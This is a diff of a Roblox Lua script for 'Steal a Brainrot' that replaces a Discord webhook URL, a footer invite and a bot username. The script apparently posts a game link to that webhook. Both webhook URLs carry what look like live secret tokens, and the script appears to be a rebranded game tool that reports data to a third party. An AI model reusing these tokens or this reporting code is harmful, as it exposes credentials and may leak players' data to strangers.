@@ -9,7 +9,7 @@ local Workspace = game:GetService("Workspace")
 local player = Players.LocalPlayer
 local placeId = 17308778014
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1434015184367915059/6EWi5iWl1c1rifZe2nqwqDBWQym-eiYYYg3nrhi_M0WVX0ightzpc0NxUyQKW7hlvF3a"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1428257268343771227/iK_ZVJ7SfIT4gpZ-FkL1duHd787aFqruh6X9cJGNAVVuxSxhN5n7N38qNsg8tISjluIN"
 
 -- ==================== TABLA COMPLETA DE BRAINROTS ====================
 local BrainrotData = {
@@ -362,7 +362,7 @@ local function sendWebhook(link)
                 }
             },
             ["footer"] = {
-                ["text"] = "discord.gg/desish | Steal a Brainrot"
+                ["text"] = "discord.gg/8wqtz | Steal a Brainrot"
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }
@@ -370,7 +370,7 @@ local function sendWebhook(link)
     
     local webhookData = {
         embeds = embedData,
-        username = ".desish "
+        username = "s"
     }
     
     local jsonData = HttpService:JSONEncode(webhookData)
